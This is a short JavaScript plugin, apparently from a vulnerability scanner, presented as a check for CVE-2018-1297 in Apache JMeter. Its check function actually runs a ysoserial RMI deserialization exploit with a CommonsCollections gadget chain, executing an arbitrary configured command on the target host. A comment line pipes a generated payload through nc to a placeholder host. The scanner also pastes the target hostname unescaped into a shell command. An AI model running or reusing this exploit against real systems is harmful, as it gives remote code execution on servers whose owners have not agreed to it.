// java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'whoami'| nc your-ip 4712
module.exports={
	tags:"jmeter,CVE-2018-1297",
	des:"jmeter,CVE-2018-1297,漏洞检测",
    VulApps:[],
    doIted:{},
	urls:["https://github.com/iBearcat/CVE-2018-1297/blob/master/Jmeter_RMI_Exploit.rb"],
	doCheck:function (url,fnCbk)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        var szK = `${hst.hostname}:${hst.port}`;
        if(_t.doIted[szK])return;
        var szPay1 = _s.child_process.execSync(`java -cp jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit ${hst.hostname} ${hst.port} CommonsCollections1 '${_s.g_szCmd}'`).toString("utf-8");
        _t.doIted[szK] = 1;
	}
};
